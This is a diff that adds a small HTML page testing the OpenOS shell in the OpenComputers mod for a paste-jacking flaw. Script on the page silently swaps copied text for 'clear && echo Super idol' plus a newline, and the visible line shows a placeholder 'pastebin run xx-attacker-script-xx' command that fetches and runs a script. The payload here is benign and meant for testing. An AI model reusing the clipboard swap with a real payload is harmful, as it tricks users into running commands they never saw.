@@ -1,0 +1,31 @@
+<DOCTYPE html>
+
+<head>
+
+<title>Copy paste vuln test 4 openos shell (opencomputers).</title>
+
+</head>
+
+<body>
+
+<p>How to test openos for copy paste vuln</p>
+
+<p>If your screen gets <strong>cleared</strong> and "Super idol" appears on your screen, then patch your OpenOS.</p>
+<p>If something along the lines of 'clear' and 'echo Super idol' or a newline (not a newline) '\\n' stays in the input field,</p>
+<p>then I think that you're safe.</p>
+<p>The hidden text actually is clear && echo "Super idol" (newline at end too?)</p>
+
+
+<p>Paste (NOT TYPE) the comnand below into your OpenOS.</p>
+<br>
+<code id="copy">pastebin run xx-attacker-script-xx && reboot</code>
+
+
+<script>
+document.getElementById('copy').addEventListener('copy', function(e) {
+  e.clipboardData.setData('text/plain', 'clear && "echo Super idol"\n');
+  e.preventDefault();
+});
+</script>
+
+<body>
